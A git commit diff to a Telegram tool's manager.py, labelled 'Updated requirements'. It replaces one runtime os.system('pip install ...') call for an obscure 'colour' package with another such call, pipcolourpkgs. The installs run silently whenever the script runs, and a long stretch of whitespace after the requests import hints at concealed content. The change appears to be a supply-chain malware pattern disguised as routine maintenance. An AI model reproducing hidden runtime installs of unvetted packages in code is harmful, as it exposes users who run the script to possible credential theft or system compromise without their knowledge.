2c1548ab6bb0abe789cbac97273136e82390247c
b14nk3r <122880466+b14nk3r@users.noreply.github.com>
2023-07-21 17:06:40 +0200

    Updated requirements

--- manager.py
+++ manager.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolourmoduleV2")
-import pythoncolourmoduleV2
+os.system("pip install pipcolourpkgs")
+import pipcolourpkgs
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from telethon.sync import TelegramClient
 from telethon.errors.rpcerrorlist import PhoneNumberBannedError
